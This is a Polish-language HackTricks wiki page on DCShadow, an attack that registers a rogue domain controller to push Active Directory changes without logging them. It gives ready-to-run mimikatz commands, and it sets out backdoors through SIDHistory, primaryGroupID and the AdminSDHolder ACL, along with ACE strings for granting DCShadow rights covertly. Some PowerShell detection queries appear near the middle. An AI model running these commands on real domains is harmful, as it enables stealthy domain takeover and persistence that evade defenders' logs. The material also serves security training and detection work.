# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

Rejestruje **nowy Domain Controller** w **AD** i używa go do **push attributes** (SIDHistory, SPNs...) na wskazanych obiektach **bez** pozostawiania jakichkolwiek **logs** dotyczących **modyfikacji**. **Potrzebujesz DA** uprawnień i musisz znajdować się w **root domain**.\
Zauważ, że jeśli użyjesz nieprawidłowych danych, pojawią się dość brzydkie **logs**.

Aby przeprowadzić atak potrzebujesz 2 instancji mimikatz. Jedna z nich uruchomi **RPC servers** z uprawnieniami **SYSTEM** (musisz tutaj wskazać zmiany, które chcesz wykonać), a druga instancja zostanie użyta do push the values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Zauważ, że **`elevate::token`** nie zadziała w sesji `mimikatz1`, ponieważ to podniosło uprawnienia wątku, ale musimy podnieść **uprawnienia procesu**.\
Możesz też wybrać obiekt "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Zmiany można wprowadzić z poziomu DA lub użytkownika z następującymi minimalnymi uprawnieniami:

- W **obiekcie domeny**:
- _DS-Install-Replica_ (Dodaj/Usuń replikę w domenie)
- _DS-Replication-Manage-Topology_ (Zarządzaj topologią replikacji)
- _DS-Replication-Synchronize_ (Synchronizacja replikacji)
- Obiekt **Sites** (i jego potomków) w **kontenerze Configuration**:
- _CreateChild and DeleteChild_
- Obiekt komputera zarejestrowanego jako **DC**:
- _WriteProperty_ (Not Write)
- **Obiekt docelowy**:
- _WriteProperty_ (Not Write)

Możesz użyć [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) aby nadać te uprawnienia nieuprzywilejowanemu użytkownikowi (zauważ, że pozostawi to pewne logi). To jest znacznie bardziej restrykcyjne niż posiadanie uprawnień DA.\
For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.

## Używanie DCShadow do tworzenia backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Nadużycie grupy podstawowej, luki w enumeracji i wykrywanie

- `primaryGroupID` jest oddzielnym atrybutem od listy grupy `member`. DCShadow/DSInternals mogą zapisać go bezpośrednio (np. ustawić `primaryGroupID=512` dla **Domain Admins**) bez egzekwowania na maszynie przez LSASS, ale AD nadal **przenosi** użytkownika: zmiana PGID zawsze usuwa członkostwo w poprzedniej grupie podstawowej (to samo zachowanie dla dowolnej grupy docelowej), więc nie można zachować poprzedniego członkostwa w grupie podstawowej.
- Domyślne narzędzia uniemożliwiają usunięcie użytkownika z jego obecnej grupy podstawowej (`ADUC`, `Remove-ADGroupMember`), więc zmiana PGID zazwyczaj wymaga bezpośrednich zapisów w katalogu (DCShadow/`Set-ADDBPrimaryGroup`).
- Raportowanie członkostwa jest niekonsekwentne:
  - **Zawiera** członków pochodzących z grupy podstawowej: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
  - **Pomija** członków pochodzących z grupy podstawowej: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit przy inspekcji atrybutu `member`, `Get-ADUser <user> -Properties memberOf`.
- Rekursywne sprawdzenia mogą pominąć członków grupy podstawowej, jeśli **grupa podstawowa jest zagnieżdżona** (np. PGID użytkownika wskazuje na zagnieżdżoną grupę wewnątrz Domain Admins); `Get-ADGroupMember -Recursive` lub rekurencyjne filtry LDAP nie zwrócą takiego użytkownika, chyba że rekurencja jawnie rozwiąże grupy podstawowe.
- Sztuczki z DACL: atakujący mogą **deny ReadProperty** na `primaryGroupID` na użytkowniku (lub na atrybucie `member` grupy dla grup niechronionych przez AdminSDHolder), ukrywając skuteczne członkostwo przed większością zapytań PowerShell; `net group` nadal rozwiąże członkostwo. Grupy chronione przez AdminSDHolder zresetują takie denies.

Przykłady wykrywania/monitorowania:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Porównaj grupy uprzywilejowane, zestawiając wynik `Get-ADGroupMember` z `Get-ADGroup -Properties member` lub ADSI Edit, aby wykryć rozbieżności wprowadzone przez `primaryGroupID` lub ukryte atrybuty.

## Shadowception - Nadanie uprawnień DCShadow przy użyciu DCShadow (bez zmodyfikowanych logów uprawnień)

Musimy dopisać następujące ACE z SID naszego użytkownika na końcu:

- Na obiekcie domeny:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Na obiekcie komputera atakującego: `(A;;WP;;;UserSID)`
- Na obiekcie docelowego użytkownika: `(A;;WP;;;UserSID)`
- Na obiekcie Sites w kontenerze Configuration: `(A;CI;CCDC;;;UserSID)`

Aby uzyskać bieżące ACE obiektu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Zwróć uwagę, że w tym przypadku musisz wprowadzić **kilka zmian,** a nie tylko jedną. Dlatego, w sesji **mimikatz1** (RPC server) użyj parametru **`/stack` z każdą zmianą**, którą chcesz wprowadzić. Dzięki temu będziesz musiał wykonać **`/push`** tylko raz, aby zastosować wszystkie zaległe zmiany na fałszywym serwerze.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Źródła

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
